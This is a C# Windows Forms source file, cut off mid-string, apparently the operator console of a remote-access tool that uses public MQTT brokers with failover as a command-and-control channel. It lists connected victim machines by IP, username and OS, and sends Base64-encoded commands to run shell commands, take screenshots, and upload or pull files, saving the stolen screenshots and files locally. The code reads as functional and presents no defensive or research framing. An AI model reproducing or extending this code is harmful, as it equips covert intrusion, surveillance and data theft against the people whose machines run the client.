using MQTTnet;
using MQTTnet.Client;
using MQTTnet.Protocol;
using Server;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Timer = System.Windows.Forms.Timer;

namespace Server
{
    public partial class Form1 : Form
    {
        private Timer _updateTimer;
        private IMqttClient _client;
        private readonly SemaphoreSlim _connectionLock = new SemaphoreSlim(1, 1);
        private bool _isReconnecting = false;
        private CancellationTokenSource _cts = new CancellationTokenSource();

        // Client command data
        private Dictionary<string, List<CommandMessage>> _clientCommandHistory = new Dictionary<string, List<CommandMessage>>();
        private Dictionary<string, TabPage> _clientTabs = new Dictionary<string, TabPage>();
        private Dictionary<string, ClientInfo> _clients = new Dictionary<string, ClientInfo>();

        // Message tracking
        private Dictionary<string, PendingMessage> _pendingMessages = new Dictionary<string, PendingMessage>();
        private static readonly TimeSpan MessageTimeout = TimeSpan.FromSeconds(10);

        // PRIORITY BROKER SYSTEM
        private static readonly (string Host, int Port)[] Brokers = {
            ("broker.hivemq.com", 1883),      // PRIMARY - Always try this first
            ("test.mosquitto.org", 1883),     // BACKUP 1
            ("broker.emqx.io", 1883)          // BACKUP 2
        };

        private int _currentBrokerIndex = 0;
        private string _currentBroker = "";
        private DateTime _lastPrimaryCheckTime = DateTime.MinValue;
        private static readonly TimeSpan PrimaryCheckInterval = TimeSpan.FromMinutes(1);

        public Form1()
        {
            InitializeComponent();
            this.FormClosing += ServerForm_FormClosing;
        }

        private async void ServerForm_Load(object sender, EventArgs e)
        {
            InitializeListView();
            InitializeTimer();
            InitializeStatusBar();
            InitializeMainLogTab();

            await StartBrokerConnection();

            // Start background tasks
            _ = Task.Run(PrimaryBrokerCheckLoop);
            _ = Task.Run(MessageRetryLoop);
        }

        private void InitializeListView()
        {
            listView1.View = View.Details;
            listView1.FullRowSelect = true;
            listView1.GridLines = true;
            listView1.Columns.Add("UUID", 180);
            listView1.Columns.Add("IP Address", 120);
            listView1.Columns.Add("Username", 120);
            listView1.Columns.Add("OS Version", 200);
            listView1.Columns.Add("Broker", 120);
            listView1.Columns.Add("Last Seen (s)", 80);
            listView1.Columns.Add("Status", 80);

            listView1.DoubleClick += ListView1_DoubleClick;

            // Create context menu
            ContextMenuStrip contextMenu = new ContextMenuStrip();

            ToolStripMenuItem screenshotItem = new ToolStripMenuItem("📸 Open Screenshots Folder");
            screenshotItem.Click += ContextMenu_OpenScreenshots;

            ToolStripMenuItem downloadItem = new ToolStripMenuItem("⬇️ Download File");
            downloadItem.Click += ContextMenu_Download;

            ToolStripMenuItem uploadItem = new ToolStripMenuItem("⬆️ Upload File");
            uploadItem.Click += ContextMenu_Upload;

            ToolStripMenuItem sysinfoItem = new ToolStripMenuItem("ℹ️ System Information");
            sysinfoItem.Click += ContextMenu_SystemInfo;

            contextMenu.Items.Add(screenshotItem);
            contextMenu.Items.Add(new ToolStripSeparator());
            contextMenu.Items.Add(downloadItem);
            contextMenu.Items.Add(uploadItem);
            contextMenu.Items.Add(new ToolStripSeparator());
            contextMenu.Items.Add(sysinfoItem);

            listView1.ContextMenuStrip = contextMenu;
        }

        private void InitializeTimer()
        {
            _updateTimer = new Timer();
            _updateTimer.Interval = 1000;
            _updateTimer.Tick += UpdateTimer_Tick;
            _updateTimer.Start();
        }

        private void InitializeStatusBar()
        {
            statusStrip1.Items.Clear();
            statusStrip1.Items.Add(new ToolStripStatusLabel("Status: Connecting..."));
            statusStrip1.Items.Add(new ToolStripStatusLabel("|"));
            statusStrip1.Items.Add(new ToolStripStatusLabel("Clients: 0"));
            statusStrip1.Items.Add(new ToolStripStatusLabel("|"));
            statusStrip1.Items.Add(new ToolStripStatusLabel("Broker: None"));
        }

        private void InitializeMainLogTab()
        {
            if (tabControl1.TabPages.Count > 0)
            {
                tabControl1.TabPages[0].Text = "📋 Main Log";
            }
        }

        private void UpdateStatusBar(string status, int clientCount, string broker)
        {
            if (statusStrip1.InvokeRequired)
            {
                statusStrip1.Invoke(new Action(() => UpdateStatusBar(status, clientCount, broker)));
                return;
            }

            string brokerLabel = _currentBrokerIndex == 0 ? "PRIMARY" : $"BACKUP #{_currentBrokerIndex}";
            statusStrip1.Items[0].Text = $"Status: {status}";
            statusStrip1.Items[2].Text = $"Clients: {clientCount}";
            statusStrip1.Items[4].Text = $"Broker: {brokerLabel} ({broker})";
        }

        private void UpdateTimer_Tick(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.Items)
            {
                int elapsed = int.Parse(item.SubItems[5].Text);
                elapsed++;
                item.SubItems[5].Text = elapsed.ToString();

                if (elapsed > 60)
                {
                    item.SubItems[6].Text = "Offline";
                    item.BackColor = Color.LightGray;
                }
                else if (elapsed > 30)
                {
                    item.SubItems[6].Text = "Idle";
                    item.BackColor = Color.LightYellow;
                }
                else
                {
                    item.SubItems[6].Text = "Active";
                    item.BackColor = Color.LightGreen;
                }
            }

            int activeCount = listView1.Items.Cast<ListViewItem>().Count(i => i.SubItems[6].Text == "Active");
            UpdateStatusBar(_client?.IsConnected == true ? "Connected" : "Disconnected", activeCount, _currentBroker);
        }

        // ================= PRIORITY BROKER CONNECTION =================

        private async Task StartBrokerConnection()
        {
            try
            {
                var factory = new MqttFactory();
                _client = factory.CreateMqttClient();

                _client.ApplicationMessageReceivedAsync += OnMessageReceived;
                _client.DisconnectedAsync += OnDisconnected;
                _client.ConnectedAsync += OnConnected;

                await ConnectWithPriorityFailover();
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Failed to start broker: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private async Task ConnectWithPriorityFailover()
        {
            await _connectionLock.WaitAsync();
            try
            {
                if (_client?.IsConnected == true)
                {
                    LogMessage("Already connected, skipping...");
                    return;
                }

                _isReconnecting = true;

                // STEP 1: Always try PRIMARY broker first (3 attempts, 10 sec each)
                LogMessage($"🔍 Trying PRIMARY broker: {Brokers[0].Host}");
                if (await TryConnectToBroker(0, attempts: 3, timeoutSeconds: 10))
                {
                    _currentBrokerIndex = 0;
                    _isReconnecting = false;
                    return;
                }

                LogMessage($"⚠ PRIMARY broker ({Brokers[0].Host}) unavailable");

                // STEP 2: Try backup brokers (1 attempt each, 5 sec timeout)
                for (int i = 1; i < Brokers.Length; i++)
                {
                    if (await TryConnectToBroker(i, attempts: 1, timeoutSeconds: 5))
                    {
                        _currentBrokerIndex = i;
                        LogMessage($"⚠ Using BACKUP broker #{i}: {Brokers[i].Host}");
                        _lastPrimaryCheckTime = DateTime.Now;
                        _isReconnecting = false;
                        return;
                    }
                }

                LogMessage("✗ ALL BROKERS FAILED");
                _isReconnecting = false;
            }
            finally
            {
                _connectionLock.Release();
            }
        }

        private async Task<bool> TryConnectToBroker(int brokerIndex, int attempts, int timeoutSeconds)
        {
            var broker = Brokers[brokerIndex];
            string brokerLabel = brokerIndex == 0 ? "PRIMARY" : $"BACKUP #{brokerIndex}";

            for (int attempt = 1; attempt <= attempts; attempt++)
            {
                try
                {
                    LogMessage($"[{brokerLabel}] Attempt {attempt}/{attempts} → {broker.Host}:{broker.Port}...");

                    var options = new MqttClientOptionsBuilder()
                        .WithClientId("server-main-" + Guid.NewGuid().ToString("N").Substring(0, 8))
                        .WithTcpServer(broker.Host, broker.Port)
                        .WithKeepAlivePeriod(TimeSpan.FromSeconds(30))
                        .WithTimeout(TimeSpan.FromSeconds(timeoutSeconds))
                        .WithCleanSession(false)
                        .WithProtocolVersion(MQTTnet.Formatter.MqttProtocolVersion.V311)
                        .Build();

                    var result = await _client.ConnectAsync(options, _cts.Token);

                    if (result.ResultCode == MqttClientConnectResultCode.Success)
                    {
                        _currentBroker = $"{broker.Host}:{broker.Port}";
                        LogMessage($"✓ CONNECTED to {brokerLabel}: {_currentBroker}");

                        await SubscribeToTopics();
                        return true;
                    }
                    else
                    {
                        LogMessage($"✗ Connection failed: {result.ResultCode}");
                    }
                }
                catch (Exception ex)
                {
                    LogMessage($"✗ Error: {ex.Message}");
                }

                if (attempt < attempts)
                {
                    await Task.Delay(1000);
                }
            }

            return false;
        }

        // ================= PRIMARY BROKER CHECK LOOP =================

        private async Task PrimaryBrokerCheckLoop()
        {
            while (!_cts.Token.IsCancellationRequested)
            {
                try
                {
                    await Task.Delay(10000, _cts.Token);

                    if (_currentBrokerIndex != 0)
                    {
                        var timeSinceLastCheck = DateTime.Now - _lastPrimaryCheckTime;

                        if (timeSinceLastCheck >= PrimaryCheckInterval)
                        {
                            LogMessage($"⏰ Checking if PRIMARY broker is back online...");

                            if (await IsPrimaryBrokerAvailable())
                            {
                                LogMessage($"✓ PRIMARY broker is back! Switching from {Brokers[_currentBrokerIndex].Host}...");
                                await SwitchToPrimaryBroker();
                            }
                            else
                            {
                                LogMessage($"✗ PRIMARY still unavailable");
                                _lastPrimaryCheckTime = DateTime.Now;
                            }
                        }
                    }
                }
                catch (OperationCanceledException)
                {
                    break;
                }
                catch (Exception ex)
                {
                    LogMessage($"✗ Primary check error: {ex.Message}");
                }
            }
        }

        private async Task<bool> IsPrimaryBrokerAvailable()
        {
            try
            {
                using (var testClient = new MqttFactory().CreateMqttClient())
                {
                    var testOptions = new MqttClientOptionsBuilder()
                        .WithClientId("server-test-" + Guid.NewGuid().ToString("N").Substring(0, 8))
                        .WithTcpServer(Brokers[0].Host, Brokers[0].Port)
                        .WithTimeout(TimeSpan.FromSeconds(5))
                        .Build();

                    var result = await testClient.ConnectAsync(testOptions);

                    if (result.ResultCode == MqttClientConnectResultCode.Success)
                    {
                        await testClient.DisconnectAsync();
                        return true;
                    }
                }
            }
            catch
            {
                // Primary not available
            }

            return false;
        }

        private async Task SwitchToPrimaryBroker()
        {
            await _connectionLock.WaitAsync();
            try
            {
                if (_client.IsConnected)
                {
                    await _client.DisconnectAsync();
                }

                if (await TryConnectToBroker(0, attempts: 2, timeoutSeconds: 10))
                {
                    _currentBrokerIndex = 0;
                    LogMessage("✓ Successfully switched to PRIMARY broker");
                    await ResendPendingMessages();
                }
                else
                {
                    LogMessage("✗ Failed to switch to primary, reconnecting to backup...");
                    await ConnectWithPriorityFailover();
                }
            }
            finally
            {
                _connectionLock.Release();
            }
        }

        // ================= MESSAGE RETRY LOGIC =================

        private async Task MessageRetryLoop()
        {
            while (!_cts.Token.IsCancellationRequested)
            {
                try
                {
                    await Task.Delay(2000, _cts.Token);

                    var now = DateTime.Now;
                    var timedOutMessages = _pendingMessages.Values
                        .Where(m => (now - m.SentTime) > MessageTimeout && !m.AckReceived)
                        .ToList();

                    foreach (var msg in timedOutMessages)
                    {
                        msg.RetryCount++;

                        if (msg.RetryCount > 3)
                        {
                            _pendingMessages.Remove(msg.Id);
                            continue;
                        }

                        try
                        {
                            // Encode the entire payload
                            string fullPayload = $"{msg.Id}|{msg.Payload}";
                            string encodedPayload = EncodeToBase64(fullPayload);

                            var message = new MqttApplicationMessageBuilder()
                                .WithTopic(msg.Topic)
                                .WithPayload(encodedPayload)
                                .WithQualityOfServiceLevel(MqttQualityOfServiceLevel.AtLeastOnce)
                                .Build();

                            await _client.PublishAsync(message, _cts.Token);
                            msg.SentTime = DateTime.Now;
                        }
                        catch (Exception ex)
                        {
                            LogMessage($"✗ Retry failed: {ex.Message}");
                        }
                    }
                }
                catch (OperationCanceledException)
                {
                    break;
                }
                catch (Exception ex)
                {
                    LogMessage($"✗ Retry loop error: {ex.Message}");
                }
            }
        }

        private async Task ResendPendingMessages()
        {
            var pending = _pendingMessages.Values.Where(m => !m.AckReceived).ToList();

            if (pending.Count > 0)
            {
                foreach (var msg in pending)
                {
                    try
                    {
                        // Encode the entire payload
                        string fullPayload = $"{msg.Id}|{msg.Payload}";
                        string encodedPayload = EncodeToBase64(fullPayload);

                        var message = new MqttApplicationMessageBuilder()
                            .WithTopic(msg.Topic)
                            .WithPayload(encodedPayload)
                            .WithQualityOfServiceLevel(MqttQualityOfServiceLevel.AtLeastOnce)
                            .Build();

                        await _client.PublishAsync(message, _cts.Token);
                        msg.SentTime = DateTime.Now;
                    }
                    catch (Exception ex)
                    {
                        LogMessage($"✗ Resend failed: {ex.Message}");
                    }
                }
            }
        }

        // ================= SUBSCRIPTION & EVENTS =================

        private async Task SubscribeToTopics()
        {
            try
            {
                var subscribeOptions = new MqttClientSubscribeOptionsBuilder()
                    .WithTopicFilter(f => f.WithTopic("demo/c2s/+").WithQualityOfServiceLevel(MqttQualityOfServiceLevel.AtLeastOnce))
                    .WithTopicFilter(f => f.WithTopic("demo/c2s/+/ack").WithQualityOfServiceLevel(MqttQualityOfServiceLevel.AtLeastOnce))
                    .Build();

                var result = await _client.SubscribeAsync(subscribeOptions);

                foreach (var item in result.Items)
                {
                    if (item.ResultCode == MqttClientSubscribeResultCode.GrantedQoS0 ||
                        item.ResultCode == MqttClientSubscribeResultCode.GrantedQoS1 ||
                        item.ResultCode == MqttClientSubscribeResultCode.GrantedQoS2)
                    {
                        LogMessage($"✓ Subscribed: {item.TopicFilter.Topic}");
                    }
                }
            }
            catch (Exception ex)
            {
                LogMessage($"✗ Subscription error: {ex.Message}");
            }
        }

        private Task OnConnected(MqttClientConnectedEventArgs e)
        {
            LogMessage("✓ Connection established");
            return Task.CompletedTask;
        }

        private async Task OnDisconnected(MqttClientDisconnectedEventArgs e)
        {
            LogMessage($"⚠ DISCONNECTED: {e.Reason}");

            if (_cts.Token.IsCancellationRequested || _isReconnecting)
            {
                return;
            }

            await Task.Delay(2000);
            _ = Task.Run(async () => await ConnectWithPriorityFailover());
        }

        private async Task OnMessageReceived(MqttApplicationMessageReceivedEventArgs e)
        {
            try
            {
                string topic = e.ApplicationMessage.Topic;
                string payload = Encoding.UTF8.GetString(e.ApplicationMessage.Payload);
                var parts = topic.Split('/');

                if (parts.Length < 3) return;

                string clientId = parts[2];

                // CLIENT → SERVER DATA (demo/c2s/{clientId})
                if (parts.Length == 3)
                {
                    // FIRST: Decode the ENTIRE payload from Base64
                    string decodedPayload = DecodeFromBase64(payload);

                    // THEN: Parse messageId|actualData format
                    var payloadParts = decodedPayload.Split(new[] { '|' }, 2);
                    string messageId = null;
                    string actualData = decodedPayload;

                    if (payloadParts.Length == 2)
                    {
                        messageId = payloadParts[0];
                        actualData = payloadParts[1];
                    }

                    // Check if it's initial connection data (contains #)
                    if (actualData.Contains("#"))
                    {
                        var data = actualData.Split('#');
                        if (data.Length >= 4)
                        {
                            AddOrUpdateClient(data[0], data[1], data[2], data[3]);
                            LogMessage($"📨 Client connected: {data[0]}");
                        }
                    }
                    // Check if it's heartbeat PING
                    else if (actualData == "PING")
                    {
                        // Update client's "Last Seen" timer (reset to 0)
                        ResetClientTimer(clientId);
                        // Don't log or show anything - silent heartbeat
                    }
                    else
                    {
                        // It's a command response - check for special formats

                        // Handle SCREENSHOT response
                        if (actualData.StartsWith("SCREENSHOT:"))
                        {
                            var screenshotParts = actualData.Split(new[] { ':' }, 3);
                            if (screenshotParts.Length == 3)
                            {
                                string filename = screenshotParts[1];
                                string base64Image = screenshotParts[2];

                                // Save screenshot to server
                                string savedPath = SaveScreenshot(clientId, filename, base64Image);

                                AddClientMessage(clientId, $"Screenshot saved: {savedPath}", false);
                                LogMessage($"📷 Screenshot received from {clientId}: {savedPath}");
                            }
                        }
                        // Handle FILE download response
                        else if (actualData.StartsWith("FILE:"))
                        {
                            var fileParts = actualData.Split(new[] { ':' }, 3);
                            if (fileParts.Length == 3)
                            {
                                string filename = fileParts[1];
                                string base64File = fileParts[2];

                                // Save file to server
                                string savedPath = SaveDownloadedFile(clientId, filename, base64File);

                                AddClientMessage(clientId, $"File downloaded: {savedPath}", false);
                                LogMessage($"📥 File received from {clientId}: {savedPath}");
                            }
                        }
                        else
                        {
                            // Regular text response
                            AddClientMessage(clientId, actualData, false);
                        }

                        // Auto-open tab if not already open
                        if (!_clientTabs.ContainsKey(clientId))
                        {
                            string username = GetClientUsername(clientId);
                            if (!string.IsNullOrEmpty(username))
                            {
                                OpenOrFocusClientTab(clientId, username);
                            }
                        }
                    }

                    // Send ACK back to client with original encoded payload
                    await SendAck(clientId, payload);
                }
                // CLIENT ACK (demo/c2s/{clientId}/ack)
                else if (parts.Length == 4 && parts[3] == "ack")
                {
                    // Decode ACK to get message ID
                    string decodedAck = DecodeFromBase64(payload);
                    HandleAck(decodedAck);
                }
            }
            catch (Exception ex)
            {
                LogMessage($"✗ Error processing message: {ex.Message}");
            }
        }

        private string GetClientUsername(string clientId)
        {
            if (listView1.InvokeRequired)
            {
                return (string)listView1.Invoke(new Func<string, string>(GetClientUsername), clientId);
            }

            foreach (ListViewItem item in listView1.Items)
            {
                if (item.SubItems[0].Text == clientId)
                {
                    return item.SubItems[2].Text; // Username column
                }
            }

            return clientId; // Fallback to clientId if username not found
        }

        private void HandleAck(string ackPayload)
        {
            try
            {
                var parts = ackPayload.Split(new[] { '|' }, 2);
                string messageId = parts.Length >= 1 ? parts[0] : ackPayload;

                if (_pendingMessages.ContainsKey(messageId))
                {
                    _pendingMessages[messageId].AckReceived = true;
                    _pendingMessages.Remove(messageId);
                }
            }
            catch (Exception ex)
            {
                LogMessage($"✗ Error handling ACK: {ex.Message}");
            }
        }

        // ================= BASE64 ENCODING/DECODING =================

        private string EncodeToBase64(string plainText)
        {
            try
            {
                byte[] plainTextBytes = Encoding.UTF8.GetBytes(plainText);
                return Convert.ToBase64String(plainTextBytes);
            }
            catch (Exception ex)
            {
                LogMessage($"✗ Error encoding to Base64: {ex.Message}");
                return plainText;
            }
        }

        private string DecodeFromBase64(string base64Text)
        {
            try
            {
                byte[] base64Bytes = Convert.FromBase64String(base64Text);
                return Encoding.UTF8.GetString(base64Bytes);
            }
            catch (Exception ex)
            {
                LogMessage($"✗ Error decoding from Base64: {ex.Message}");
                return base64Text;
            }
        }

        private string SaveScreenshot(string clientId, string filename, string base64Data)
        {
            try
            {
                // Create screenshots directory next to exe
                string exeDir = Path.GetDirectoryName(Application.ExecutablePath);
                string screenshotDir = Path.Combine(exeDir, "Screenshots", clientId);
                Directory.CreateDirectory(screenshotDir);

                string filepath = Path.Combine(screenshotDir, filename);
                byte[] imageBytes = Convert.FromBase64String(base64Data);
                File.WriteAllBytes(filepath, imageBytes);

                // Open folder
                //try
                //{
                //    Process.Start("explorer.exe", screenshotDir);
                //}
                //catch { }

                return filepath;
            }
            catch (Exception ex)
            {
                LogMessage($"✗ Error saving screenshot: {ex.Message}");
                return $"Error: {ex.Message}";
            }
        }

        private string SaveDownloadedFile(string clientId, string filename, string base64Data)
        {
            try
            {
                // Create downloads directory next to exe
                string exeDir = Path.GetDirectoryName(Application.ExecutablePath);
                string downloadDir = Path.Combine(exeDir, "Downloads", clientId);
                Directory.CreateDirectory(downloadDir);

                string filepath = Path.Combine(downloadDir, filename);
                byte[] fileBytes = Convert.FromBase64String(base64Data);
                File.WriteAllBytes(filepath, fileBytes);

                // Open folder
                //try
                //{
                //    Process.Start("explorer.exe", downloadDir);
                //}
                //catch { }

                return filepath;
            }
            catch (Exception ex)
            {
                LogMessage($"✗ Error saving file: {ex.Message}");
                return $"Error: {ex.Message}";
            }
        }

        // ================= TAB MANAGEMENT =================

        private void ListView1_DoubleClick(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count == 0) return;

            string clientId = listView1.SelectedItems[0].SubItems[0].Text;
            string username = listView1.SelectedItems[0].SubItems[2].Text;

            OpenOrFocusClientTab(clientId, username);
        }

        private void OpenOrFocusClientTab(string clientId, string username)
        {
            if (tabControl1.InvokeRequired)
            {
                tabControl1.Invoke(new Action(() => OpenOrFocusClientTab(clientId, username)));
                return;
            }

            if (_clientTabs.ContainsKey(clientId))
            {
                tabControl1.SelectedTab = _clientTabs[clientId];
                return;
            }

            TabPage newTab = new TabPage($"💬 {username}");
            newTab.Tag = clientId;

            // Create the UI controls
            CreateChatUI(newTab, clientId);

            // Add tab to the TabControl FIRST so controls are properly initialized
            tabControl1.TabPages.Add(newTab);

            // Initialize chat history for this client if needed
            if (!_clientCommandHistory.ContainsKey(clientId))
            {
                _clientCommandHistory[clientId] = new List<CommandMessage>();
            }

            // Register the tab in the dictionary AFTER it's added to the control
            _clientTabs[clientId] = newTab;

            // Now load any existing chat history - controls are guaranteed to exist now
            LoadCommandHistory(newTab, clientId);

            // Select the new tab
            tabControl1.SelectedTab = newTab;
        }

        private void CreateChatUI(TabPage tab, string clientId)
        {
            TableLayoutPanel layout = new TableLayoutPanel();
            layout.Dock = DockStyle.Fill;
            layout.RowCount = 2;
            layout.RowStyles.Add(new RowStyle(SizeType.Percent, 100F));
            layout.RowStyles.Add(new RowStyle(SizeType.Absolute, 35F));
            layout.Padding = new Padding(5);

            TextBox txtCommandHistory = new TextBox();
            txtCommandHistory.Name = "txtChatHistory";
            txtCommandHistory.Multiline = true;
            txtCommandHistory.ReadOnly = true;
            txtCommandHistory.ScrollBars = ScrollBars.Vertical;
            txtCommandHistory.Font = new Font("Consolas", 9F);
            txtCommandHistory.Dock = DockStyle.Fill;
            txtCommandHistory.BackColor = Color.White;

            TableLayoutPanel bottomPanel = new TableLayoutPanel();
            bottomPanel.Dock = DockStyle.Fill;
            bottomPanel.ColumnCount = 2;
            bottomPanel.ColumnStyles.Add(new ColumnStyle(SizeType.Percent, 85F));
            bottomPanel.ColumnStyles.Add(new ColumnStyle(SizeType.Percent, 15F));

            TextBox txtCommand = new TextBox();
            txtCommand.Name = "txtInput";
            txtCommand.Dock = DockStyle.Fill;
            txtCommand.Font = new Font("Segoe UI", 10F);

            Button btnSend = new Button();
            btnSend.Text = "Send";
            btnSend.Dock = DockStyle.Fill;
            btnSend.BackColor = Color.DodgerBlue;
            btnSend.ForeColor = Color.White;
            btnSend.FlatStyle = FlatStyle.Flat;
            btnSend.Click += (s, e) => SendMessageToClient(clientId, txtCommand, txtCommandHistory);

            txtCommand.KeyPress += (s, e) => {
                if (e.KeyChar == (char)Keys.Enter)
                {
                    e.Handled = true;
                    SendMessageToClient(clientId, txtCommand, txtCommandHistory);
                }
            };

            bottomPanel.Controls.Add(txtCommand, 0, 0);
            bottomPanel.Controls.Add(btnSend, 1, 0);

            layout.Controls.Add(txtCommandHistory, 0, 0);
            layout.Controls.Add(bottomPanel, 0, 1);

            tab.Controls.Add(layout);
        }

        private void LoadCommandHistory(TabPage tab, string clientId)
        {
            if (!_clientCommandHistory.ContainsKey(clientId)) return;

            TextBox txtCommandHistory = FindControlByName<TextBox>(tab, "txtChatHistory");

            if (txtCommandHistory == null) return;

            txtCommandHistory.Clear();

            foreach (var msg in _clientCommandHistory[clientId])
            {
                AppendCommandMessage(txtCommandHistory, msg);
            }
        }

        private void AppendCommandMessage(TextBox commandBox, CommandMessage message)
        {
            string prefix = message.IsFromServer ? "📤 Command" : "📥 Response";
            string timestamp = message.Timestamp.ToString("HH:mm:ss");
            commandBox.AppendText($"[{timestamp}] {prefix}: {message.Message}\r\n");
            commandBox.SelectionStart = commandBox.Text.Length;
            commandBox.ScrollToCaret();
        }

        // Client state tracking
        private Dictionary<string, ClientState> _clientStates = new Dictionary<string, ClientState>();

        private void SendMessageToClient(string clientId, TextBox inputBox, TextBox commandBox)
        {
            string message = inputBox.Text.Trim();
            if (string.IsNullOrEmpty(message)) return;

            // Check if client is currently executing a command
            if (_clientStates.ContainsKey(clientId) && _clientStates[clientId].IsExecutingCommand)
            {
                commandBox.AppendText($"[{DateTime.Now:HH:mm:ss}] ⚠ Client is currently executing a command. Please wait...\r\n");
                commandBox.SelectionStart = commandBox.Text.Length;
                commandBox.ScrollToCaret();
                return;
            }

            // Check if it's a help command
            if (message.Equals("help", StringComparison.OrdinalIgnoreCase))
            {
                ShowHelpMessage(commandBox);
                inputBox.Clear();
                inputBox.Focus();
                return;
            }

            // Check if it's a specific help command (e.g., "help shell")
            if (message.StartsWith("help ", StringComparison.OrdinalIgnoreCase))
            {
                string commandName = message.Substring(5).Trim().ToLower();
                ShowCommandHelp(commandBox, commandName);
                inputBox.Clear();
                inputBox.Focus();
                return;
            }

            // Validate if it's a recognized command
            if (!IsValidCommand(message))
            {
                ShowHelpMessage(commandBox);
                inputBox.Clear();
                inputBox.Focus();
                return;
            }

            // Mark client as executing command
            if (!_clientStates.ContainsKey(clientId))
            {
                _clientStates[clientId] = new ClientState();
            }
            _clientStates[clientId].IsExecutingCommand = true;
            _clientStates[clientId].CurrentCommand = message;
            _clientStates[clientId].CommandStartTime = DateTime.Now;

            // Display the command in command box (decoded for readability)
            var commandMsg = new CommandMessage
            {
                Message = message,
                IsFromServer = true,
                Timestamp = DateTime.Now
            };

            if (!_clientCommandHistory.ContainsKey(clientId))
            {
                _clientCommandHistory[clientId] = new List<CommandMessage>();
            }
            _clientCommandHistory[clientId].Add(commandMsg);

            AppendCommandMessage(commandBox, commandMsg);

            // Show "Executing..." message
            commandBox.AppendText($"[{DateTime.Now:HH:mm:ss}] ⏳ Executing command, please wait...\r\n");
            commandBox.SelectionStart = commandBox.Text.Length;
            commandBox.ScrollToCaret();

            // Send the command (Base64 encoded)
            _ = SendToClientWithRetry(clientId, message);

            inputBox.Clear();
            inputBox.Focus();
        }

        private bool IsValidCommand(string message)
        {
            string[] validCommands = { "shell", "screenshot", "dir", "whoami", "download", "upload", "tasklist", "systeminfo" };

            string command = message.Split(' ')[0].ToLower();
            return validCommands.Contains(command);
        }

        private void AddClientMessage(string clientId, string message, bool isFromServer)
        {
            // Clear executing state when response received
            if (!isFromServer && _clientStates.ContainsKey(clientId))
            {
                _clientStates[clientId].IsExecutingCommand = false;
                _clientStates[clientId].CurrentCommand = null;
            }

            if (!_clientCommandHistory.ContainsKey(clientId))
            {
                _clientCommandHistory[clientId] = new List<CommandMessage>();
            }

            var chatMsg = new CommandMessage
            {
                Message = message,
                IsFromServer = isFromServer,
                Timestamp = DateTime.Now
            };

            _clientCommandHistory[clientId].Add(chatMsg);

            // Only try to update tab if it's already open
            if (_clientTabs.ContainsKey(clientId))
            {
                UpdateClientTabChat(clientId, chatMsg);
            }
        }

        private void UpdateClientTabChat(string clientId, CommandMessage message)
        {
            if (!_clientTabs.ContainsKey(clientId))
            {
                return;
            }

            TabPage tab = _clientTabs[clientId];

            if (tab.InvokeRequired)
            {
                tab.Invoke(new Action(() => UpdateClientTabChat(clientId, message)));
                return;
            }

            try
            {
                // Make sure the tab has been fully initialized before accessing controls
                if (tab.Controls.Count == 0)
                {
                    return;
                }

                // Find txtChatHistory using recursive search
                TextBox txtChatHistory = FindControlByName<TextBox>(tab, "txtChatHistory");

                if (txtChatHistory != null)
                {
                    AppendCommandMessage(txtChatHistory, message);
                }
            }
            catch (Exception ex)
            {
                LogMessage($"✗ Error updating tab for {clientId}: {ex.Message}");
            }
        }

        private T FindControlByName<T>(Control parent, string name) where T : Control
        {
            foreach (Control ctrl in parent.Controls)
            {
                if (ctrl is T && ctrl.Name == name)
                {
                    return ctrl as T;
                }

                T found = FindControlByName<T>(ctrl, name);
                if (found != null)
                {
                    return found;
                }
            }
            return null;
        }

        // ================= CONTEXT MENU HANDLERS =================

        private void ContextMenu_OpenScreenshots(object sender, EventArgs e)
        {
            string screenshotPath = Path.Combine(Application.StartupPath, "Screenshots");

            if (!Directory.Exists(screenshotPath))
            {
                Directory.CreateDirectory(screenshotPath);
            }

            try
            {
                System.Diagnostics.Process.Start("explorer.exe", screenshotPath);
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Failed to open screenshots folder: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void ContextMenu_Download(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count == 0)
            {
                MessageBox.Show("Please select a client first.", "No Client Selected", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }

            string clientId = listView1.SelectedItems[0].SubItems[0].Text;
            string username = listView1.SelectedItems[0].SubItems[2].Text;

            DownloadForm downloadForm = new DownloadForm(clientId, username, this);
            downloadForm.ShowDialog();
        }

        private void ContextMenu_Upload(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count == 0)
            {
                MessageBox.Show("Please select a client first.", "No Client Selected", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }

            string clientId = listView1.SelectedItems[0].SubItems[0].Text;
            string username = listView1.SelectedItems[0].SubItems[2].Text;

            UploadForm uploadForm = new UploadForm(clientId, username, this);
            uploadForm.ShowDialog();
        }

        private void ContextMenu_SystemInfo(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count == 0)
            {
                MessageBox.Show("Please select a client first.", "No Client Selected", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }

            string clientId = listView1.SelectedItems[0].SubItems[0].Text;
            string username = listView1.SelectedItems[0].SubItems[2].Text;

            // Open or focus the client tab
            OpenOrFocusClientTab(clientId, username);

            // Send systeminfo command
            _ = SendToClientWithRetry(clientId, "systeminfo");
        }

        public async Task SendCommandToClient(string clientId, string command)
        {
            await SendToClientWithRetry(clientId, command);
        }

        // ================= HELP SYSTEM =================

        private void ShowHelpMessage(TextBox commandBox)
        {
            string helpText =
"╔════════════════════════════════════════════════════════════╗\r\n" +
"║                    AVAILABLE COMMANDS                      ║\r\n" +
"║                   (Commands Only Mode)                     ║\r\n" +
"╠════════════════════════════════════════════════════════════╣\r\n" +
"║  shell       - Execute shell commands on client            ║\r\n" +
"║  screenshot  - Capture screenshot from client              ║\r\n" +
"║  dir         - List files and directories                  ║\r\n" +
"║  whoami      - Get current user information                ║\r\n" +
"║  download    - Download file from client                   ║\r\n" +
"║  upload      - Upload file to client                       ║\r\n" +
//"║  tasklist    - List running processes                      ║\r\n" +
"║  systeminfo  - Get detailed system information             ║\r\n" +
"╠════════════════════════════════════════════════════════════╣\r\n" +
